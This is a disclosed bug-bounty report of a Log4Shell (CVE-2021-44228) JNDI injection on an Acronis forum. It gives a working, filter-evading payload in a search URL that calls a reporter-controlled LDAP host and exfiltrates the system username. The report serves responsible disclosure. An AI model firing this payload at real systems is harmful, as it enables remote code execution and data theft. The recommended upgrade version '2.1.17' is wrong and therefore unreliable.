# [forum.acronis.com] JNDI Code Injection due an outdated log4j component

## Report Details
- **Report ID**: 1430622
- **URL**: https://hackerone.com/reports/1430622
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2021-12-19T06:07:01.894Z
- **Disclosed**: 2024-08-28T09:04:18.391Z

## Reporter
- **Username**: godiego
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: acronis

## Vulnerability Information
## Summary

Hi team,

It seems that the machine is affected by the latest CVE-2021-44228 which grants any authenticated user command execution. The vulnerability affects the remote asset forum.acronis.com and this issue allows to remote attackers to perfom Remote Code Execution via JNDI exfiltration.

## Steps To Reproduce

Vulnerable request is: `https://forum.acronis.com/search?s=${j${main:\k5:-Nd}i${spring:k5:-:}ldap://${sys:user.name}-04363f1f3427b48.test3.ggdd.co.uk/}`.

Which generates a pingback exfiltrating the information to my controlled server `ggdd.co.uk`:

{F1551515}

We can see that the system username is `solr`.

## Recommendations

Upgrade Log4j to latest version, 2.1.17.

## Impact

Remote OS command injection via JNDI queries.

## Attachments
- Screenshot_2021-12-19_at_06-05-20_TukTuk.png
